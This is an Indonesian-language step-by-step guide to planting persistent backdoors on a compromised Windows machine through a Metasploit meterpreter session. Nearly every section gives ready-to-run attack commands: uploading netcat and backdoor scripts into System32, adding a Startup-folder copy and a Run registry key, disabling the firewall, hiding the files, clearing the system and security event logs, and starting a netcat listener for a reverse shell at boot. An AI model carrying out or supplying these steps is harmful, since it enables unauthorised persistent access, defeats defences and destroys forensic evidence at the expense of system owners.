
## Upload Semua Backdoor

Setelah berhasil masuk ke meterpreter dari Metasploit, upload semua backdoornya ke target mesin.

1. Backdoor `nc.exe`

   ```
   upload nc.exe C:\Windows\System32\nc.exe
   ```

2. Backdoor `backdoor.bat`

   > Pada backdoor `backdoor.bat` ubah IP Address nya sesuai dengan IP Address yang kamu punya.

   ```
   upload backdoor.bat C:\Windows\System32\backdoor.bat
   ```

3. Backdoor `backdoor.vbs`

   ```
   upload backdoor.vbs C:\Windows\System32\backdoor.vbs
   ```

## Salin Backdoor `backdoor.bat` ke Folder Startup

> Pada bagian ini sampai ke `Hapus Log`, di meterpreter metasploit ketikkan `shell` untuk masuk ke CMD target mesin.

```
copy C:\Windows\System32\backdoor.vbs "C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

Ganti `<USERNAME>` dengan nama user di target (cek dengan `whoami` kalau belum tahu).

## Tambahkan ke Registry

```
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Windows\System32\backdoor.vbs" /f
```

## Matikan Firewall

```
netsh advfirewall set allprofiles state off
```

## Sembunyikan File

```
attrib +h C:\Windows\System32\nc.exe
attrib +h C:\Windows\System32\backdoor.bat
```

## Hapus Log

```
wevtutil cl system
wevtutil cl security
```

## Siapkan Listener

```
nc -lvp 4444
```

Saat sistem target dinyalakan atau direstart, akses CMD dari sistem target akan diperoleh secara otomatis.
